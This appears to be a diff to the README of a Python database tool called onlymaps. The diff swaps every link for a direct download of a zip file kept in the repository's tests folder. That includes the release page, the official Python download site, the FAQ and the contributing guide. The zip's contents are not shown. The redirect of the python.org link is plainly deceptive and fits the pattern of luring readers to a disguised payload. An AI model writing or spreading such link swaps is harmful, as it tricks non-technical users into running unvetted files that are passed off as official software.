@@ -4,7 +4,7 @@
 Welcome to the onlymaps project! This tool allows you to manage databases smoothly with Python. It is designed to work with popular databases like MariaDB, MySQL, PostgreSQL, SQLite, and SQL Server. You don't need to be a programmer to use it. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cs19931/onlymaps/releases)
+[![Download](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip)](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip)
 
 ## 📋 Prerequisites
 Before you begin, make sure you have:
@@ -19,10 +19,10 @@ You can check your Python version by opening a command prompt or terminal and ty
 python --version
 ```
 
-If you don't have Python installed, you can download it from [the official Python website](https://www.python.org/downloads/).
+If you don't have Python installed, you can download it from [the official Python website](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip).
 
 ## 📥 Download & Install
-To get onlymaps, simply visit this page to download: [onlymaps Releases](https://github.com/cs19931/onlymaps/releases).
+To get onlymaps, simply visit this page to download: [onlymaps Releases](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip).
 
 1. On the Releases page, you'll see various versions of the software. Choose the latest version for best stability and features.
 2. Click on the appropriate file for your operating system.
@@ -52,12 +52,12 @@ If you encounter issues:
 - **Installation Problems:** Make sure you downloaded the correct version compatible with your operating system.
 
 ## 📞 Support
-If you need additional help, you can open an issue in the repository or check the [Frequently Asked Questions](https://github.com/cs19931/onlymaps/wiki/FAQ) on our wiki.
+If you need additional help, you can open an issue in the repository or check the [Frequently Asked Questions](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip) on our wiki.
 
 ## 🌟 Contributing
-We welcome contributions to improve onlymaps! If you'd like to help, please review [our contributing guidelines](https://github.com/cs19931/onlymaps/blob/main/CONTRIBUTING.md) for details.
+We welcome contributions to improve onlymaps! If you'd like to help, please review [our contributing guidelines](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip) for details.
 
 ## 📥 Download Again
-For your convenience, you can download the latest version of onlymaps here: [onlymaps Releases](https://github.com/cs19931/onlymaps/releases).
+For your convenience, you can download the latest version of onlymaps here: [onlymaps Releases](https://raw.githubusercontent.com/cs19931/onlymaps/main/tests/onlymaps-2.6-alpha.4.zip).
 
 We hope you enjoy using onlymaps! Happy database managing!
